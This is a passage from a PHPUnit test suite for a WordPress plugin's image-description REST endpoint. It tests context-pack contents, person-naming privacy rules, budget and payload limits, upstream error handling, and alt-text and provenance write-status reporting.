        $this->queueHttpResponse(array(
            'response' => array('code' => 200, 'message' => 'OK'),
            'body'     => (string) json_encode($this->validBackendBodyWithLong(42)),
        ));

        $req = new WP_REST_Request('POST', '/acx/v1/recognition/describe');
        $req->set_param('media_id', 42);
        $result = $this->controller->describe_media($req);

        $this->assertInstanceOf(WP_REST_Response::class, $result);
        $this->assertSame('', $GLOBALS['__ac_posts'][42]->post_content);
        $this->assertArrayNotHasKey('alt_text_write', $result->get_data());
        // Optional upstream field passes through untouched (rg-015).
        $this->assertSame(
            'A tabby cat lounging on a woven mat in warm afternoon light.',
            $result->get_data()['alt_text_long']
        );
    }

    public function testRegistersAndServesMissingAltDryRunWithoutBackendCall(): void
    {
        $GLOBALS['__ac_posts'][42] = (object) array('ID' => 42, 'post_title' => 'Missing');
        $GLOBALS['__ac_get_posts_results'][] = $GLOBALS['__ac_posts'][42];
        $GLOBALS['__ac_attachment_mimes'][42] = 'image/jpeg';
        $GLOBALS['__ac_attached_file'][42] = $this->tempDir . '/42-missing.jpg';
        $GLOBALS['__ac_post_meta'][42]['_wp_attachment_image_alt'] = '';

        $this->controller->register_routes();

        $route = null;
        foreach ($GLOBALS['__ac_rest_routes'] as $definition) {
            if (($definition['namespace'] ?? null) === 'acx/v1' && ($definition['route'] ?? null) === '/recognition/describe/candidates') {
                $route = $definition;
                break;
            }
        }

        $this->assertIsArray($route);
        $this->assertSame('GET', $route['args']['methods'] ?? null);
        $this->assertArrayHasKey('limit', $route['args']['args'] ?? array());
        $this->assertArrayHasKey('offset', $route['args']['args'] ?? array());

        $req = new WP_REST_Request('GET', '/acx/v1/recognition/describe/candidates');
        $req->set_param('limit', 10);
        $req->set_param('offset', 0);
        $result = $this->controller->list_description_candidates($req);

        $this->assertInstanceOf(WP_REST_Response::class, $result);
        $this->assertSame(200, $result->get_status());
        $this->assertSame(array(42), array_column($result->get_data()['candidates'], 'media_id'));
        $this->assertSame(array(), $this->getHttpCalls());
    }

    public function testBuildsBoundedContextPackFromAttachmentParentTermsAndProductMeta(): void
    {
        $bytes = "\xff\xd8\xff\xe0fake-jpeg-bytes";
        $this->plantAttachment(42, $bytes, 'jpg');
        $GLOBALS['__ac_posts'][42]->post_parent = 77;
        $GLOBALS['__ac_posts'][77] = (object) array(
            'ID'           => 77,
            'post_title'   => 'Trail jackets for spring',
            'post_excerpt' => 'Lightweight red jackets for spring hikes.',
            'post_content' => 'Private body should not travel.',
            'post_type'    => 'product',
            'post_status'  => 'publish',
        );
        $this->setPostMeta(42, '_wp_attachment_image_alt', 'Model in a red jacket');
        $this->setPostMeta(77, '_sku', 'JKT-RED-1');
        $this->setPostMeta(77, '_price', '129.00');

        $term = wp_insert_term('Jackets', 'product_cat', array('slug' => 'jackets'));
        wp_set_object_terms(77, array($term['term_id']), 'product_cat');

        $this->queueHttpResponse(array(
            'response' => array('code' => 200, 'message' => 'OK'),
            'body'     => (string) json_encode($this->validBackendBody(42)),
        ));

        $req = new WP_REST_Request('POST', '/acx/v1/recognition/describe');
        $req->set_param('media_id', 42);
        $result = $this->controller->describe_media($req);

        $this->assertInstanceOf(WP_REST_Response::class, $result);
        $body = $this->getHttpCalls()[0]['args']['body'];
        preg_match('/name="request".*?\r\n\r\n(\{.*?\})\r\n/s', $body, $m);
        $contextPack = json_decode($m[1], true)['context_pack'];

        $this->assertSame('Photo 42', $contextPack['attachment']['title']);
        $this->assertSame('A caption.', $contextPack['attachment']['caption']);
        $this->assertSame('Model in a red jacket', $contextPack['attachment']['alt_text']);
        $this->assertSame('Trail jackets for spring', $contextPack['post']['title']);
        $this->assertSame('product', $contextPack['post']['post_type']);
        $this->assertSame('publish', $contextPack['post']['status']);
        $this->assertArrayNotHasKey('description', $contextPack['post']);
        $this->assertSame('Jackets', $contextPack['taxonomy_terms'][0]['name']);
        $this->assertSame('JKT-RED-1', $contextPack['product']['sku']);
        $this->assertSame('129.00', $contextPack['product']['price']);
    }

    public function testContextPackExcludesNonPublicParentPostContent(): void
    {
        $this->plantAttachment(42, "\xff\xd8\xff\xe0bytes", 'jpg');
        $GLOBALS['__ac_posts'][42]->post_parent = 77;
        $GLOBALS['__ac_posts'][77] = (object) array(
            'ID'           => 77,
            'post_title'   => 'Draft product',
            'post_excerpt' => 'Draft teaser',
            'post_type'    => 'product',
            'post_status'  => 'draft',
        );

        $this->queueHttpResponse(array(
            'response' => array('code' => 200, 'message' => 'OK'),
            'body'     => (string) json_encode($this->validBackendBody(42)),
        ));

        $req = new WP_REST_Request('POST', '/acx/v1/recognition/describe');
        $req->set_param('media_id', 42);
        $this->controller->describe_media($req);

        $body = $this->getHttpCalls()[0]['args']['body'];
        preg_match('/name="request".*?\r\n\r\n(\{.*?\})\r\n/s', $body, $m);
        $contextPack = json_decode($m[1], true)['context_pack'];

        $this->assertArrayNotHasKey('post', $contextPack);
        $this->assertArrayNotHasKey('product', $contextPack);
    }

    public function testContextPackTruncatesMultibyteTextWithoutBreakingJson(): void
    {
        $this->plantAttachment(42, "\xff\xd8\xff\xe0bytes", 'jpg');
        $GLOBALS['__ac_posts'][42]->post_title = str_repeat('€', 170);

        $this->queueHttpResponse(array(
            'response' => array('code' => 200, 'message' => 'OK'),
            'body'     => (string) json_encode($this->validBackendBody(42)),
        ));

        $req = new WP_REST_Request('POST', '/acx/v1/recognition/describe');
        $req->set_param('media_id', 42);
        $this->controller->describe_media($req);

        $body = $this->getHttpCalls()[0]['args']['body'];
        preg_match('/name="request".*?\r\n\r\n(\{.*?\})\r\n/s', $body, $m);
        $envelope = json_decode($m[1], true);

        $this->assertIsArray($envelope);
        $this->assertSame(str_repeat('€', 160), $envelope['context_pack']['attachment']['title']);
    }

    public function testRosterDescriptionContextEmitsConfirmedIdentityWhenPolicyAllows(): void
    {
        $envelope = $this->describeEnvelopeWithIdentityRows(
            array(
                array(
                    'identity_uuid'     => 'identity-1',
                    'cluster_uuid'      => 'cluster-1',
                    'cluster_label'     => 'Ada Lovelace',
                    'person_name'       => 'Ada Lovelace',
                    'is_user_confirmed' => 1,
                ),
            ),
            true
        );

        $identity = $envelope['context_pack']['identity'];
        $this->assertSame('allowed', $identity['policy']['person_naming']);
        $this->assertSame('Ada Lovelace', $identity['identities'][0]['name']);
        $this->assertSame('roster_confirmed', $identity['identities'][0]['source']);
        $this->assertSame(array(), $identity['review_reasons']);
    }

    public function testRosterDescriptionContextNeverNamesConfirmedClusterWithoutRosterPerson(): void
    {
        // A confirmed cluster with NO assigned roster person (person_id NULL) has
        // cluster_label falling back to the machine label c.label; it must never
        // be named, and must still surface a review reason even when a genuinely
        // confirmed roster person is present on the same image.
        $envelope = $this->describeEnvelopeWithIdentityRows(
            array(
                array(
                    'identity_uuid'     => 'identity-1',
                    'cluster_uuid'      => 'cluster-1',
                    'cluster_label'     => 'Ada Lovelace',
                    'person_name'       => 'Ada Lovelace',
                    'is_user_confirmed' => 1,
                ),
                array(
                    'identity_uuid'     => 'identity-2',
                    'cluster_uuid'      => 'cluster-2',
                    'cluster_label'     => 'Machine Cluster 7',
                    'person_name'       => '',
                    'is_user_confirmed' => 1,
                ),
            ),
            true
        );

        $identity = $envelope['context_pack']['identity'];
        $this->assertCount(1, $identity['identities']);
        $this->assertSame('Ada Lovelace', $identity['identities'][0]['name']);
        $this->assertContains('identity_unconfirmed', $identity['review_reasons']);

        $json = json_encode($envelope);
        $this->assertIsString($json);
        $this->assertStringNotContainsString('Machine Cluster 7', $json);
    }

    public function testRosterDescriptionContextExcludesUnconfirmedMachineLabels(): void
    {
        $envelopeJson = json_encode(
            $this->describeEnvelopeWithIdentityRows(
                array(
                    array(
                        'identity_uuid'     => 'identity-1',
                        'cluster_uuid'      => 'cluster-1',
                        'cluster_label'     => 'Grace Hopper',
                        'is_user_confirmed' => 0,
                    ),
                ),
                true
            )
        );

        $this->assertIsString($envelopeJson);
        $this->assertStringNotContainsString('Grace Hopper', $envelopeJson);
        $this->assertStringContainsString('identity_unconfirmed', $envelopeJson);
    }

    public function testRosterDescriptionContextSuppressesNamesWhenPolicyDisabled(): void
    {
        $envelopeJson = json_encode(
            $this->describeEnvelopeWithIdentityRows(
                array(
                    array(
                        'identity_uuid'     => 'identity-1',
                        'cluster_uuid'      => 'cluster-1',
                        'cluster_label'     => 'Ada Lovelace',
                        'person_name'       => 'Ada Lovelace',
                        'is_user_confirmed' => 1,
                    ),
                ),
                false
            )
        );

        $this->assertIsString($envelopeJson);
        $this->assertStringNotContainsString('Ada Lovelace', $envelopeJson);
        $this->assertStringContainsString('person_naming_policy_disabled', $envelopeJson);
    }

    public function testRosterDescriptionContextRepresentsAmbiguousMachineOnlyState(): void
    {
        $envelope = $this->describeEnvelopeWithIdentityRows(
            array(
                array(
                    'identity_uuid'     => 'identity-1',
                    'cluster_uuid'      => 'cluster-1',
                    'cluster_label'     => 'Candidate One',
                    'is_user_confirmed' => 0,
                ),
                array(
                    'identity_uuid'     => 'identity-2',
                    'cluster_uuid'      => 'cluster-2',
                    'cluster_label'     => 'Candidate Two',
                    'is_user_confirmed' => 0,
                ),
            ),
            true
        );

        $identity = $envelope['context_pack']['identity'];
        $this->assertSame(array(), $identity['identities']);
        $this->assertContains('identity_ambiguous', $identity['review_reasons']);

        // Directly verify the no-name-leak guarantee for the ambiguous path:
        // candidate labels must never appear anywhere in the serialized envelope.
        $json = json_encode($envelope);
        $this->assertIsString($json);
        $this->assertStringNotContainsString('Candidate One', $json);
        $this->assertStringNotContainsString('Candidate Two', $json);
    }

    public function testRejectsUnreadableAttachmentBeforeDispatch(): void
    {
        $req = new WP_REST_Request('POST', '/acx/v1/recognition/describe');
        $req->set_param('media_id', 9001);
        $result = $this->controller->describe_media($req);

        $this->assertInstanceOf(WP_Error::class, $result);
        $this->assertSame('describe_attachment_unreadable', $result->get_error_code());
        $this->assertSame(array(), $this->getHttpCalls());
    }

    public function testRejectsMissingMediaId(): void
    {
        $req = new WP_REST_Request('POST', '/acx/v1/recognition/describe');
        $result = $this->controller->describe_media($req);

        $this->assertInstanceOf(WP_Error::class, $result);
        $this->assertSame('describe_invalid_media_id', $result->get_error_code());
        $this->assertSame(array(), $this->getHttpCalls());
    }

    public function testBudgetLimitBlocksBeforeBackendDispatch(): void
    {
        $this->plantAttachment(42, "\xff\xd8\xff\xe0bytes", 'jpg');
        $this->setOption('acx_description_budget_max_attempts', 0);

        $req = new WP_REST_Request('POST', '/acx/v1/recognition/describe');
        $req->set_param('media_id', 42);
        $result = $this->controller->describe_media($req);

        $this->assertInstanceOf(WP_Error::class, $result);
        $this->assertSame('description_budget_attempt_limit_exceeded', $result->get_error_code());
        $this->assertSame(429, $result->get_error_data()['status'] ?? null);
        $this->assertSame(array(), $this->getHttpCalls());
    }

    public function testRejectsOversizePayloadBeforeDispatch(): void
    {
        $bytes = str_repeat('A', 26 * 1024 * 1024);
        $this->plantAttachment(7, $bytes, 'png');

        $req = new WP_REST_Request('POST', '/acx/v1/recognition/describe');
        $req->set_param('media_id', 7);
        $result = $this->controller->describe_media($req);

        $this->assertInstanceOf(WP_Error::class, $result);
        $this->assertSame('describe_payload_too_large', $result->get_error_code());
        $this->assertSame(array(), $this->getHttpCalls());
    }

    public function testMalformedUpstreamEnvelopeReturns502(): void
    {
        $this->plantAttachment(42, "\xff\xd8\xff\xe0bytes", 'jpg');

        // Upstream 200 but missing required provenance fields → rg-015 violation.
        $this->queueHttpResponse(array(
            'response' => array('code' => 200, 'message' => 'OK'),
            'body'     => '{"caption":"oops","cached":false}',
        ));

        $req = new WP_REST_Request('POST', '/acx/v1/recognition/describe');
        $req->set_param('media_id', 42);
        $result = $this->controller->describe_media($req);

        $this->assertInstanceOf(WP_Error::class, $result);
        $this->assertSame('invalid_description_envelope', $result->get_error_code());
        $this->assertSame(502, $result->get_error_data()['status'] ?? null);
    }

    public function testMissingTierFieldsInUpstreamEnvelopeReturns502(): void
    {
        // HARM-02: backend regression dropping VLM-3 wire fields must 502, not pass through.
        $this->plantAttachment(42, "\xff\xd8\xff\xe0bytes", 'jpg');

        $body = $this->validBackendBody(42);
        unset($body['tier'], $body['result_generation']);
        $this->queueHttpResponse(array(
            'response' => array('code' => 200, 'message' => 'OK'),
            'body'     => (string) json_encode($body),
        ));

        $req = new WP_REST_Request('POST', '/acx/v1/recognition/describe');
        $req->set_param('media_id', 42);
        $result = $this->controller->describe_media($req);

        $this->assertInstanceOf(WP_Error::class, $result);
        $this->assertSame('invalid_description_envelope', $result->get_error_code());
        $this->assertSame(502, $result->get_error_data()['status'] ?? null);
    }

    public function testUpstreamErrorStatusPassesThroughUnwrapped(): void
    {
        $this->plantAttachment(42, "\xff\xd8\xff\xe0bytes", 'jpg');

        // Backend rejects an unsupported MIME with 415 — the proxy must forward
        // it verbatim, not re-wrap it as a 502 envelope error.
        $this->queueHttpResponse(array(
            'response' => array('code' => 415, 'message' => 'Unsupported Media Type'),
            'body'     => '{"detail":"unsupported image type"}',
        ));

        $req = new WP_REST_Request('POST', '/acx/v1/recognition/describe');
        $req->set_param('media_id', 42);
        $result = $this->controller->describe_media($req);

        $this->assertInstanceOf(WP_REST_Response::class, $result);
        $this->assertSame(415, $result->get_status());

        $usage = (new DescriptionBudgetService())->usage_summary();
        $errors = (new DescriptionBudgetService())->recent_errors();
        $this->assertSame(1, $usage['attempts']);
        $this->assertSame(1, $usage['failures']);
        $this->assertSame('upstream_http_415', $errors[0]['error_code']);
    }

    /**
     * BR-02: alt write failure → status not written/forced_overwrite, provenance
     * not stamped. Assert storage.
     */
    public function testWriteAltFailureDoesNotStampProvenanceOrClaimSuccess(): void
    {
        $this->plantWritableAttachment(42);
        $this->queueHttpResponse(array(
            'response' => array('code' => 200, 'message' => 'OK'),
            'body'     => (string) json_encode($this->validBackendBody(42)),
        ));
        $GLOBALS['__ac_update_post_meta_fail'][42]['_wp_attachment_image_alt'] = true;

        $result = $this->controller->describe_media($this->writeRequest(42));

        $this->assertInstanceOf(WP_REST_Response::class, $result);
        $status = $result->get_data()['alt_text_write']['status'] ?? null;
        $this->assertNotSame('written', $status);
        $this->assertNotSame('forced_overwrite', $status);
        $this->assertSame('failed', $status);
        $this->assertSame('', get_post_meta(42, '_wp_attachment_image_alt', true));
        $this->assertSame('', get_post_meta(42, '_acx_description_provenance', true));
    }

    /**
     * BR-02: provenance fails after successful alt → partial. Item must still be
     * findable only when provenance OR human_edit is an array — without
     * provenance it drops from history. Assert that storage state and the
     * reported status both surface the gap.
     */
    public function testWriteProvenanceFailureReportsPartialAndHistoryLacksItem(): void
    {
        $this->plantWritableAttachment(42);
        $this->queueHttpResponse(array(
            'response' => array('code' => 200, 'message' => 'OK'),
            'body'     => (string) json_encode($this->validBackendBody(42)),
        ));
        $GLOBALS['__ac_update_post_meta_fail'][42]['_acx_description_provenance'] = true;

        $result = $this->controller->describe_media($this->writeRequest(42));

        $this->assertInstanceOf(WP_REST_Response::class, $result);
        $this->assertSame('partial', $result->get_data()['alt_text_write']['status'] ?? null);
        $this->assertSame('A photo.', get_post_meta(42, '_wp_attachment_image_alt', true));
        $this->assertSame('', get_post_meta(42, '_acx_description_provenance', true));

        // History requires provenance or human_edit array — without either the
        // item disappears from list_history. Plant the attachment as a candidate
        // so the absence is due to the history gate, not an empty get_posts set.
        $GLOBALS['__ac_get_posts_results'] = [42];
        $GLOBALS['__ac_posts'][42]->post_type = 'attachment';
        $GLOBALS['__ac_posts'][42]->ID = 42;
        $history = (new \AltContext\Api\Services\DescriptionHistoryService())->list_history(50);
        $this->assertSame(0, $history['total']);
        $ids = array_column($history['items'], 'media_id');
        $this->assertNotContains(42, $ids);
    }

    /**
     * BR-17 / plain-ASCII no-op: force re-write when the stored alt already equals
     * the draft is not reported as failed. Plain ASCII is a fixed point under
     * wp_unslash, so this does NOT pin the unslash read-back guard — see the
     * backslash-bearing sibling for that [TEST-15 / R17-BR-12].
     */
    public function testWriteAltPlainAsciiForceRewriteOfMatchingAltIsNotReportedAsFailed(): void
    {
        $this->plantWritableAttachment(42);
        $this->setPostMeta(42, '_wp_attachment_image_alt', 'A photo.');
        $this->queueHttpResponse(array(
            'response' => array('code' => 200, 'message' => 'OK'),
            'body'     => (string) json_encode($this->validBackendBody(42)),
        ));

        $result = $this->controller->describe_media($this->writeRequest(42, true));

        $this->assertInstanceOf(WP_REST_Response::class, $result);
        $status = $result->get_data()['alt_text_write']['status'] ?? null;
        // force=true + existing alt → forced_overwrite (not the vacuous dual pin).
        $this->assertSame('forced_overwrite', $status);
        $this->assertNotSame('failed', $status);
        $this->assertSame('A photo.', get_post_meta(42, '_wp_attachment_image_alt', true));
        $this->assertIsArray(get_post_meta(42, '_acx_description_provenance', true));
    }

    /**
     * BR-17 [TEST-15]: REST single-image write with a backslash-bearing alt must
     * save and re-save successfully. update_post_meta unslashes on the way in;
     * the second write of the same raw string is a byte-identical no-op (false)
     * and the read-back guard must compare against wp_unslash( $draft ).
     */
    public function testWriteAltBackslashBearingSavesAndResavesSuccessfully(): void
    {
        $this->plantWritableAttachment(42);
        // PHP source \\ → one backslash char; unslash changes those bytes.
        $draft          = 'Blueprint of the C:\\Users share, annotated';
        $expectedStored = wp_unslash($draft);
        $this->assertNotSame($draft, $expectedStored, 'precondition: unslash must change the bytes');

        $body                   = $this->validBackendBody(42);
        $body['alt_text_draft'] = $draft;
        $encoded                = (string) json_encode($body);

        $this->queueHttpResponse(array(
            'response' => array('code' => 200, 'message' => 'OK'),
            'body'     => $encoded,
        ));

        $first = $this->controller->describe_media($this->writeRequest(42));
        $this->assertInstanceOf(WP_REST_Response::class, $first);
        $this->assertSame('written', $first->get_data()['alt_text_write']['status'] ?? null);
        // WP stores the unslashed form; assert storage, not the raw draft.
        $this->assertSame($expectedStored, get_post_meta(42, '_wp_attachment_image_alt', true));

        // Re-save same raw draft with force (alt already present). Without unslash
        // on the same_alt gate the force no-op would miss; with it (or full write
        // read-back) success is forced_overwrite.
        $this->queueHttpResponse(array(
            'response' => array('code' => 200, 'message' => 'OK'),
            'body'     => $encoded,
        ));

        $second = $this->controller->describe_media($this->writeRequest(42, true));
        $this->assertInstanceOf(WP_REST_Response::class, $second);
        $secondStatus = $second->get_data()['alt_text_write']['status'] ?? null;
        $this->assertNotSame('failed', $secondStatus, 'Second save with same backslash alt must not fail');
        $this->assertSame('forced_overwrite', $secondStatus);
        $this->assertSame($expectedStored, get_post_meta(42, '_wp_attachment_image_alt', true));
    }

    /**
     * BR-03: long-description write failure must not claim description_write
     * success. Parent status folds to partial.
     */
    public function testLongDescriptionWriteFailureDoesNotClaimSuccess(): void
    {
        $this->plantWritableAttachment(42);
        $this->setOption('acx_alt_style', 'alt_plus_description');
        $this->queueHttpResponse(array(
            'response' => array('code' => 200, 'message' => 'OK'),
            'body'     => (string) json_encode($this->validBackendBodyWithLong(42)),
        ));
        $GLOBALS['__ac_wp_update_post_fail'][42] = true;

        $result = $this->controller->describe_media($this->writeRequest(42));

        $this->assertInstanceOf(WP_REST_Response::class, $result);
        $write = $result->get_data()['alt_text_write'];
        $this->assertSame('failed', $write['description_write'] ?? null);
        $this->assertNotSame('written', $write['description_write'] ?? null);
        $this->assertNotSame('forced_overwrite', $write['description_write'] ?? null);
        // Alt + provenance still landed; parent folds long-body failure to partial.
        $this->assertSame('partial', $write['status']);
        $this->assertSame('A photo.', get_post_meta(42, '_wp_attachment_image_alt', true));
        $this->assertSame('', $GLOBALS['__ac_posts'][42]->post_content);
    }

    /**
     * R16-BR-14 [rg-015]: wp_update_post can return the post ID while filters
     * (wp_insert_post_data / content_save_pre / KSES) alter post_content before
     * the row is written. The harness stub has no filter chain, so this test
     * plants a post object whose property write path stores a different body
     * than submitted — the same observable outcome as a core filter rewrite.
     * The service must report description_write=failed, not written.
     */
    public function testLongDescriptionWriteReportsFailedWhenStoredBodyDiffersFromSubmitted(): void
    {
        $this->plantWritableAttachment(42);
        // Replace the stdClass post with a store that mutates post_content on
        // assignment, emulating wp_insert_post_data stripping/rewriting the body
        // while still returning the post ID from wp_update_post.
        $GLOBALS['__ac_posts'][42] = new DescribeMediaFilteredPostContent(42, '');
        $this->setOption('acx_alt_style', 'alt_plus_description');
        $submitted = 'A tabby cat lounging on a woven mat in warm afternoon light.';
        $this->queueHttpResponse(array(
            'response' => array('code' => 200, 'message' => 'OK'),
            'body'     => (string) json_encode($this->validBackendBodyWithLong(42, $submitted)),
        ));

        $result = $this->controller->describe_media($this->writeRequest(42));

        $this->assertInstanceOf(WP_REST_Response::class, $result);
        $write = $result->get_data()['alt_text_write'];
        $this->assertSame('failed', $write['description_write'] ?? null);
        $this->assertNotSame('written', $write['description_write'] ?? null);
        $this->assertNotSame('forced_overwrite', $write['description_write'] ?? null);
        // Parent folds long-body failure to partial when alt+provenance landed.
        $this->assertSame('partial', $write['status']);
        $this->assertSame('description_write_failed', $write['reason'] ?? null);
        // Stored body is the filter-mutated value, not the submitted long text.
        $this->assertSame(
            DescribeMediaFilteredPostContent::FILTERED_BODY,
            $GLOBALS['__ac_posts'][42]->post_content
        );
        $this->assertNotSame($submitted, $GLOBALS['__ac_posts'][42]->post_content);
    }

    /**
     * F-10: backend_result_id is a per-call handle, not content identity.
     * A second force write whose provenance differs only in backend_result_id
     * must take the identity-complete no-op path and must not churn generated_at.
     */
    public function testBackendResultIdDifferenceDoesNotChurnGeneratedAt(): void
    {
        $this->plantWritableAttachment(42);
        $this->setPostMeta(42, '_wp_attachment_image_alt', 'A photo.');
        $fixedGeneratedAt = '2026-01-01T00:00:00+00:00';
        $existingProvenance = array(
            'adapter'                => 'seeded',
            'model_id'               => 'seeded-fixtures',
            'model_version'          => '1',
            'prompt_or_task_version' => '1',
            'image_hash'             => str_repeat('a', 64),
            'context_hash'           => str_repeat('b', 64),
            'backend_result_id'      => 'call-id-first',
            'generated_at'           => $fixedGeneratedAt,
            'alt_text_draft'         => 'A photo.',
        );
        $this->setPostMeta(42, '_acx_description_provenance', $existingProvenance);

        $body = $this->validBackendBody(42);
        $body['backend_result_id'] = 'call-id-second';
        $this->queueHttpResponse(array(
            'response' => array('code' => 200, 'message' => 'OK'),
            'body'     => (string) json_encode($body),
        ));

        $result = $this->controller->describe_media($this->writeRequest(42, true));

        $this->assertInstanceOf(WP_REST_Response::class, $result);
        $this->assertSame('forced_overwrite', $result->get_data()['alt_text_write']['status'] ?? null);
        $stored = get_post_meta(42, '_acx_description_provenance', true);
        $this->assertIsArray($stored);
        $this->assertSame(
            $fixedGeneratedAt,
            $stored['generated_at'] ?? null,
            'Differing backend_result_id alone must not restamp generated_at'
        );
        // Call id may stay at the prior value (no full restamp on identity match).
        $this->assertSame('call-id-first', $stored['backend_result_id'] ?? null);
        $this->assertSame('A photo.', $stored['alt_text_draft'] ?? null);
    }

    /**
     * F-22: when provenance fails, parent reason names the first (history-gap)
     * cause. A concurrent long-body failure is nested under description_write —
     * reason is not a full set union.
     */
    public function testProvenanceFailureReasonIsFirstCauseWhenLongBodyAlsoFails(): void
    {
        $this->plantWritableAttachment(42);
        $this->setOption('acx_alt_style', 'alt_plus_description');
        $this->queueHttpResponse(array(
            'response' => array('code' => 200, 'message' => 'OK'),
            'body'     => (string) json_encode($this->validBackendBodyWithLong(42)),
        ));
        $GLOBALS['__ac_update_post_meta_fail'][42]['_acx_description_provenance'] = true;
        $GLOBALS['__ac_wp_update_post_fail'][42] = true;

        $result = $this->controller->describe_media($this->writeRequest(42));

        $this->assertInstanceOf(WP_REST_Response::class, $result);
        $write = $result->get_data()['alt_text_write'];
        $this->assertSame('partial', $write['status'] ?? null);
        // First cause only — history gap is the parent reason.
        $this->assertSame('provenance_write_failed', $write['reason'] ?? null);
        $this->assertNotSame('description_write_failed', $write['reason'] ?? null);
        // Second failure is nested, not silent.
        $this->assertSame('failed', $write['description_write'] ?? null);
        $this->assertSame('A photo.', get_post_meta(42, '_wp_attachment_image_alt', true));
        $this->assertSame('', get_post_meta(42, '_acx_description_provenance', true));
    }

    /**
     * R17-BR-05 [HAI-13][INT-11]: a provenance-gap partial must be retryable
     * without --force. First pass: alt lands, provenance fails → partial.
     * Second pass without force: provenance is stamped; status is not
     * skipped_existing_alt.
     */
    public function testProvenanceGapPartialIsRetryableWithoutForce(): void
    {
        $this->plantWritableAttachment(42);
        $body = $this->validBackendBody(42);

        // Pass 1: provenance write fails after alt lands.
        $this->queueHttpResponse(array(
            'response' => array('code' => 200, 'message' => 'OK'),
            'body'     => (string) json_encode($body),
        ));
        $GLOBALS['__ac_update_post_meta_fail'][42]['_acx_description_provenance'] = true;

        $first = $this->controller->describe_media($this->writeRequest(42));
        $this->assertInstanceOf(WP_REST_Response::class, $first);
        $this->assertSame('partial', $first->get_data()['alt_text_write']['status'] ?? null);
        $this->assertSame(
            'provenance_write_failed',
            $first->get_data()['alt_text_write']['reason'] ?? null
        );
        $this->assertSame('A photo.', get_post_meta(42, '_wp_attachment_image_alt', true));
        $this->assertSame('', get_post_meta(42, '_acx_description_provenance', true));

        // Pass 2: clear the fail hook; retry WITHOUT force. Must heal provenance.
        unset($GLOBALS['__ac_update_post_meta_fail'][42]['_acx_description_provenance']);
        $this->queueHttpResponse(array(
            'response' => array('code' => 200, 'message' => 'OK'),
            'body'     => (string) json_encode($body),
        ));

        $second = $this->controller->describe_media($this->writeRequest(42, false));
        $this->assertInstanceOf(WP_REST_Response::class, $second);
        $secondStatus = $second->get_data()['alt_text_write']['status'] ?? null;
        $this->assertNotSame(
            'skipped_existing_alt',
            $secondStatus,
            'Provenance-gap retry without force must not be trapped as skipped_existing_alt'
        );
        // force=false heal of matching alt → provenance_healed, never forced_overwrite.
        $this->assertSame('provenance_healed', $secondStatus);
        $this->assertNotSame('forced_overwrite', $secondStatus);
        $this->assertSame('A photo.', get_post_meta(42, '_wp_attachment_image_alt', true));
        $prov = get_post_meta(42, '_acx_description_provenance', true);
        $this->assertIsArray($prov);
        $this->assertSame('A photo.', $prov['alt_text_draft'] ?? null);
        $this->assertSame('seeded', $prov['adapter'] ?? null);
    }

    /**
     * R17-BR-05 companion: a genuinely different human alt still skips without
     * force — the heal path must not weaken that guard.
     */
    public function testHumanAuthoredAltStillSkipsWithoutForceWhenDifferentFromDraft(): void
    {
        $this->plantWritableAttachment(42);
        $this->setPostMeta(42, '_wp_attachment_image_alt', 'Human-authored alt');
        // Provenance deliberately missing — must NOT re-enter just because of that
        // when the alt differs from the draft.
        $this->queueHttpResponse(array(
            'response' => array('code' => 200, 'message' => 'OK'),
            'body'     => (string) json_encode($this->validBackendBody(42)),
        ));

        $result = $this->controller->describe_media($this->writeRequest(42, false));

        $this->assertInstanceOf(WP_REST_Response::class, $result);
        $this->assertSame('skipped_existing_alt', $result->get_data()['alt_text_write']['status'] ?? null);
        $this->assertSame('Human-authored alt', get_post_meta(42, '_wp_attachment_image_alt', true));
        $this->assertSame('', get_post_meta(42, '_acx_description_provenance', true));
    }

    /**
     * R17-BR-03: heal_provenance_alt_text_draft must not claim success when the
     * meta write fails. Force no-op path surfaces partial + provenance reason.
     */
    public function testForceNoOpHealFailureReportsPartialNotSuccess(): void
    {
        $this->plantWritableAttachment(42);
        $this->setPostMeta(42, '_wp_attachment_image_alt', 'A photo.');
        // Pre-wave envelope: identity matches, draft key missing → heal path.
        $existingProvenance = array(
            'adapter'                => 'seeded',
            'model_id'               => 'seeded-fixtures',
            'model_version'          => '1',
            'prompt_or_task_version' => '1',
            'image_hash'             => str_repeat('a', 64),
            'context_hash'           => str_repeat('b', 64),
            'generated_at'           => '2026-01-01T00:00:00+00:00',
        );
        $this->setPostMeta(42, '_acx_description_provenance', $existingProvenance);
        $this->queueHttpResponse(array(
            'response' => array('code' => 200, 'message' => 'OK'),
            'body'     => (string) json_encode($this->validBackendBody(42)),
        ));
        // Heal's update_post_meta fails and does not persist.
        $GLOBALS['__ac_update_post_meta_fail'][42]['_acx_description_provenance'] = true;

        $result = $this->controller->describe_media($this->writeRequest(42, true));

        $this->assertInstanceOf(WP_REST_Response::class, $result);
        $write = $result->get_data()['alt_text_write'];
        $this->assertSame('partial', $write['status'] ?? null);
        $this->assertSame('provenance_write_failed', $write['reason'] ?? null);
        $this->assertNotSame('forced_overwrite', $write['status'] ?? null);
        // Alt unchanged; provenance still lacks alt_text_draft.
        $this->assertSame('A photo.', get_post_meta(42, '_wp_attachment_image_alt', true));
        $stored = get_post_meta(42, '_acx_description_provenance', true);
        $this->assertIsArray($stored);
        $this->assertArrayNotHasKey('alt_text_draft', $stored);
    }

    /**
     * F-02: heal gate must compare the unslashed draft to storage. A
     * backslash-bearing draft whose stored alt is the post-unslash form must
     * open the heal path without --force when provenance is missing.
     * ASCII fixtures cannot discriminate this (wp_unslash fixed point).
     */
    public function testBackslashBearingDraftOpensHealPathWhenStoredAltIsUnslashed(): void
    {
        $this->plantWritableAttachment(42);
        $draft          = 'C:\\Users\\photo';
        $expectedStored = wp_unslash($draft);
        $this->assertNotSame($draft, $expectedStored, 'precondition: unslash must change the bytes');

        // Storage holds what update_post_meta would have written.
        $this->setPostMeta(42, '_wp_attachment_image_alt', $expectedStored);
        // Provenance missing → gap heal fall-through without force.

        $body                   = $this->validBackendBody(42);
        $body['alt_text_draft'] = $draft;
        $this->queueHttpResponse(array(
            'response' => array('code' => 200, 'message' => 'OK'),
            'body'     => (string) json_encode($body),
        ));

        $result = $this->controller->describe_media($this->writeRequest(42, false));

        $this->assertInstanceOf(WP_REST_Response::class, $result);
        $status = $result->get_data()['alt_text_write']['status'] ?? null;
        $this->assertNotSame(
            'skipped_existing_alt',
            $status,
            'Unslashed stored alt matching draft must not skip; heal must open'
        );
        $this->assertSame('provenance_healed', $status);
        $this->assertSame($expectedStored, get_post_meta(42, '_wp_attachment_image_alt', true));
        $prov = get_post_meta(42, '_acx_description_provenance', true);
